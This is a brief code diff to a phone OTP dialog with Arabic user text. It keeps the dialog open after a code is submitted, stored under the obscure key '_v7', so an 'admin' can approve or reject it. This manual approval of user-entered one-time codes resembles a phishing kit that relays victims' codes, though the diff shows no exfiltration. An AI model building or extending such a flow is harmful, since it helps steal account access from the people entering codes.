@@ -148,13 +148,10 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
         _v7: otp
       }, "pending")
 
-      console.log("[PhoneOTP] OTP submitted, closing dialog and showing waiting modal")
+      console.log("[PhoneOTP] OTP submitted, keeping dialog open and waiting for admin decision")
       
-      // Close OTP dialog
-      onOpenChange(false)
-      
-      // Show waiting modal based on carrier
-      onShowWaitingModal(phoneCarrier)
+      // Keep dialog open - don't close or show waiting modal
+      // The listener will handle approval/rejection
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
       setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
